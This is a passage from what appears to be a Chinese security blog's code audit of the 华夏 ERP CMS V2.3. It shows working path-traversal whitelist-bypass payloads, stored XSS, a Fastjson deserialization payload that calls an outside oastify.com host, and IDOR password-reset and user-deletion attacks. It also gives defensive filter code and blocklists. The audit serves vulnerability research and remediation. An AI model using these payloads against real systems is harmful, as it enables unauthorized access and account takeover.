+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>我们可以自定义过滤的恶意字符，比如 <code>--+</code>；<code>&#39;</code> 这些非业务需要的字符。</p>
+<h3 id="3-两个白名单的越权（权限校验绕过）"><a href="#3-两个白名单的越权（权限校验绕过）" class="headerlink" title="3. 两个白名单的越权（权限校验绕过）"></a>3. 两个白名单的越权（权限校验绕过）</h3><ul>
+<li>看完了 SQL 注入，看一下关于前文提到的白名单越权的</li>
+</ul>
+<h4 id="正常业务-URL-加白"><a href="#正常业务-URL-加白" class="headerlink" title="正常业务 URL 加白"></a>正常业务 URL 加白</h4><p>资源加白的问题在前面已经说过了，我们现在直接来复现一遍</p>
+<p>当我们没有处于登录态的时候，发包&#x2F;访问时得到的是一个 302 的重定向回显，如图</p>
+<img src="/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/Login302.png" class="">
+
+<p>前文说到，这几种请求是不会被拦截的：<code>/doc.html</code>，<code>/register.html</code>，<code>/login.html</code></p>
+<p>所以我们构造如下 payload</p>
+<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">&#x2F;login.html&#x2F;..&#x2F;home.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/ingoreBypass.png" class="">
+
+<p>成功 Bypass</p>
+<h4 id="资源加白"><a href="#资源加白" class="headerlink" title="资源加白"></a>资源加白</h4><p>同上面是一样的，因为没有做严格的 <code>endsWith()</code> 的判断</p>
+<p>payload 如下</p>
+<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">&#x2F;1.css&#x2F;..&#x2F;home.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/cssBypass.png" class="">
+
+<h4 id="URL-加白"><a href="#URL-加白" class="headerlink" title="URL 加白"></a>URL 加白</h4><p>同样的攻击手段</p>
+<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">&#x2F;user&#x2F;login&#x2F;..&#x2F;..&#x2F;home.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>这个攻击不如前两种好用，它要求你知道文件的路径</p>
+<img src="/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/URLBypass.png" class="">
+
+<h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>最简单的应急方法应该是过滤 <code>../</code> ，也就是寻常的目录遍历防御手段一直，这种防御可以直接加在 Filter 里面，代码如下</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token class-name">PathTravelFilter</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>regex<span class="token punctuation">.</span></span><span class="token class-name">Pattern</span><span class="token punctuation">;</span>
+
+<span class="token comment">/**
+ @ author: Drunkbaby
+ @ usages: 用于目录遍历的单个字符防御
+ */</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">PathFilter</span> <span class="token punctuation">&#123;</span>
+
+    <span class="token comment">//private static Pattern FilePattern = Pattern.compile("[\\\\/:*?\"&lt;>|]");</span>
+
+    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">Pattern</span> <span class="token class-name">FilePattern</span> <span class="token operator">=</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token function">compile</span><span class="token punctuation">(</span><span class="token string">"[\\s\\.:?&lt;>|]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//过滤规则</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">filenameFilter</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> str<span class="token operator">==</span><span class="token keyword">null</span><span class="token operator">?</span><span class="token keyword">null</span><span class="token operator">:</span><span class="token class-name">FilePattern</span><span class="token punctuation">.</span><span class="token function">matcher</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">String</span> str<span class="token operator">=</span><span class="token string">"home/..  &lt;>|logs/../:edata?"</span><span class="token punctuation">;</span>
+        <span class="token comment">//String filenameFilter = filenameFilter(str);</span>
+        <span class="token class-name">String</span> filenameFilter <span class="token operator">=</span> <span class="token function">fileNameValidate</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>filenameFilter<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">fileNameValidate</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+
+        <span class="token class-name">String</span> strInjectListStr <span class="token operator">=</span><span class="token string">"../|./|/..| |&lt;|>|:|?"</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token operator">!=</span>strInjectListStr <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token string">""</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>strInjectListStr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            str <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> badStrs <span class="token operator">=</span> strInjectListStr<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"\\|"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> badStrs<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>badStrs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                    str<span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>badStrs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">&#125;</span>
+            <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">return</span> str<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="4-存储型-XSS"><a href="#4-存储型-XSS" class="headerlink" title="4. 存储型 XSS"></a>4. 存储型 XSS</h3><p>在之前审计 <code>Filter</code> 的时候并未发现针对 XSS 进行了些许过滤</p>
+<p>XSS 本质上是把我们输入的东西拼接到 HTML 语句里面去，这一块我们先随意选取一个界面</p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;index.html#&#x2F;pages&#x2F;financial&#x2F;item_in.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>在备注当中插入即可，今年蓝帽杯决赛的时候也是出了这个题目，这道题目名叫《赌怪》，我个人对于这道题目的理解就是，这是一个洞很多的 CMS，最好就全修了，但是当时上 Filter 防御失败了。</p>
+<img src="/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/XSS.png" class="">
+
+<p>每一次访问的时候都会造成 XSS</p>
+<img src="/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/StoredXSS.png" class="">
+
+<p>在很多界面都存在这个问题，比如说用户管理这里，添加用户，也会造成存储型 XSS</p>
+<img src="/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/DrunkbabyInfo.png" class="">
+
+<img src="/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/StoredXSSTwo.png" class="">
+
+<h4 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>直接添加 Filter 的方式会比较直接</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">
+<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequestWrapper</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span><span class="token punctuation">;</span>
+
+<span class="token comment">/**
+ @ author: Drunkbaby
+ @ usages: 用于 XSS 的自定义防护
+ */</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">XSSFilter</span> <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">&#123;</span>
+
+    <span class="token class-name">FilterConfig</span> filterConfig <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token class-name">List</span> urlExclusion <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">FilterConfig</span> filterConfig<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>filterConfig <span class="token operator">=</span> filterConfig<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>filterConfig <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span> chain<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">HttpServletRequest</span> httpServletRequest <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">)</span> request<span class="token punctuation">;</span>
+        <span class="token class-name">String</span> servletPath <span class="token operator">=</span> httpServletRequest<span class="token punctuation">.</span><span class="token function">getServletPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>urlExclusion <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> urlExclusion<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>servletPath<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            chain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+            chain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span><span class="token punctuation">)</span> <span class="token keyword">new</span> <span class="token class-name">XssHttpServletRequestWrapper</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">)</span> request<span class="token punctuation">)</span><span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token class-name">List</span> <span class="token function">getUrlExclusion</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> urlExclusion<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setUrlExclusion</span><span class="token punctuation">(</span><span class="token class-name">List</span> urlExclusion<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>urlExclusion <span class="token operator">=</span> urlExclusion<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">class</span> <span class="token class-name">XssHttpServletRequestWrapper</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServletRequestWrapper</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token class-name">XssHttpServletRequestWrapper</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> servletRequest<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">super</span><span class="token punctuation">(</span>servletRequest<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getParameterValues</span><span class="token punctuation">(</span><span class="token class-name">String</span> parameter<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> values <span class="token operator">=</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">getParameterValues</span><span class="token punctuation">(</span>parameter<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>values <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+
+        <span class="token keyword">int</span> count <span class="token operator">=</span> values<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
+        <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> encodedValues <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span>count<span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> count<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            encodedValues<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">cleanXSS</span><span class="token punctuation">(</span>values<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">return</span> encodedValues<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token class-name">String</span> parameter<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">String</span> value <span class="token operator">=</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span>parameter<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">return</span> <span class="token function">cleanXSS</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">String</span> value <span class="token operator">=</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token function">cleanXSS</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">private</span> <span class="token class-name">String</span> <span class="token function">cleanXSS</span><span class="token punctuation">(</span><span class="token class-name">String</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+<span class="token comment">//You'll need to remove the spaces from the html entities below</span>
+        value <span class="token operator">=</span> value<span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">"\\("</span><span class="token punctuation">,</span> <span class="token string">"&amp; #40;"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">"\\)"</span><span class="token punctuation">,</span> <span class="token string">"&amp; #41;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        value <span class="token operator">=</span> value<span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token string">"&amp; #39;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        value <span class="token operator">=</span> value<span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">"eval\\((.*)\\)"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        value <span class="token operator">=</span> value<span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">"[\\\"\\\'][\\s]*javascript:(.*)[\\\"\\\']"</span><span class="token punctuation">,</span> <span class="token string">"\"\""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        value <span class="token operator">=</span> value<span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">"script"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> value<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>通过转义恶意字符的方式进行修复，但是我个人认为这里这么修不算是一种好的修法，算是俗修。</p>
+<p>真正修法应该是写一个 Utils 的工具类，把一些输入进行处理，并且因为这里不存在反射型 XSS，还有一种修法，可以把这些要存入数据库的数据进行过滤。这个在实际开发里面用的比较多。</p>
+<h3 id="5-Fastjson-反序列化-RCE"><a href="#5-Fastjson-反序列化-RCE" class="headerlink" title="5. Fastjson 反序列化 RCE"></a>5. Fastjson 反序列化 RCE</h3><p>因为在项目中 <code>Fastjson</code> 版本是 1.2.55，存在 RCE 的漏洞，这里反序列化的地方很多，我们要去找的地方一定是要输入可控的。</p>
+<p>这里我思考了一下，应该直接去找关于 <code>search</code> 的，也就是和上面 SQL 注入的一样，全局搜索 <code>parseObject</code>，找到了 <code>StringUtil</code> 这个工具类</p>
+<img src="/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/parseObject.png" class="">
+
+<p>它的 <code>getInfo()</code> 方法中，是存在一个 <code>parseObject()</code> 反序列化的语句，我们接下来去找谁调用了 <code>StringUtil.getInfo()</code></p>
+<img src="/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/getInfoUsages.png" class="">
+
+<ul>
+<li>这一个 <code>UserComponent.getUserList()</code> 其实和我们之前在 SQL 注入漏洞里面看到的是一样的，所以对于攻击来说，我们依旧可以把它作为攻击的入口。</li>
+</ul>
+<p>构造一个 URLDns 的请求，payload 如下</p>
+<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">search&#x3D;&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;xtuit14cnmcrndt2043mwlxoafg74w.oastify.com&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>发包如图</p>
+<img src="/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/fastjsonBag.png" class="">
+
+<p>收到了 DNS 请求</p>
+<img src="/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/FastjsonDNS.png" class="">
+
+<ul>
+<li>证明存在 Fastjson 漏洞，然后我们进一步构造 payload，进行弹 shell 实践。</li>
+</ul>
+<p>这里对 jdk 版本是要低一些，并且要先开启 <code>AutoTypeSupport</code></p>
+<img src="/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/checkAutoType.png" class="">
+
+<p>师傅们可以现在本地进行测试。</p>
+<p>先开启恶意 <code>.class</code> 和 Ldap</p>
+<img src="/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/OpenCalc.png" class="">
+
+<p>弹计算器成功</p>
+<img src="/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/SuccessFastjson.png" class="">
+
+<h4 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><ul>
+<li>我个人认为这里并不算漏洞，因为并未开启 <code>checkAutoType</code></li>
+</ul>
+<h3 id="6-越权漏洞"><a href="#6-越权漏洞" class="headerlink" title="6. 越权漏洞"></a>6. 越权漏洞</h3><h4 id="越权密码重置"><a href="#越权密码重置" class="headerlink" title="越权密码重置"></a>越权密码重置</h4><p>对应这里，先去看它的接口</p>
+<img src="/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/updateUserController.png" class="">
+
+<p>发现这个业务逻辑的代码是写在 Service 层里面的，跟进一下 Service 层的代码</p>
+<img src="/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/ProblemReset.png" class="">
+
+<p>这里只是简单判断了 <code>&quot;admin&quot;.equals(loginName)</code>，从开发的角度上来说，我个人这里可能更偏向于使用 JWT，或者说加一个 Admin 的白名单，诸如此类的设计思维。</p>
+<p>在判断完 <code>&quot;admin&quot;.equals(loginName)</code> 之后，如果不是 admin，这里就直接进行 <code>user.setPassword()</code> 了，并未将 ID 与 loginName 一一对应。</p>
+<p>漏洞操作如图，先进行密码重置</p>
+<img src="/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/OriId.png" class="">
+
+<p>接着，修改 userId 为其他用户的，这里可以进行批量发包，会导致所有普通用户的密码全部被修改</p>
+<img src="/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/changePwdAttack.png" class="">
+
+<ul>
+<li>这里的这个漏洞，可以和之前我们说的未授权漏洞结合起来。</li>
+</ul>
+<h4 id="越权删除用户"><a href="#越权删除用户" class="headerlink" title="越权删除用户"></a>越权删除用户</h4><ul>
+<li>先去看 <code>deleteUser</code> 对应的接口</li>
+</ul>
+<img src="/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/deleteUser.png" class="">
+
+<p>同样，去看 Service 层的业务代码</p>
+<img src="/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/BatDeleteUser.png" class="">
+
+<p>这里其实这么写是也有道理的，我们可以发现普通用户是没有管理用户这个界面的，所以对于代码来说，也是情有可原。</p>
+<p>但是问题就出在 <code>doc.html</code> 中，这个接口文档在被未授权读取之后，能够看到所有的 URL，配合之前的未授权可以进行删库的操作，但是可利用性并不大。</p>
+<p>我们先用 admin 的账户抓一个 <code>deleteUser</code> 的包</p>
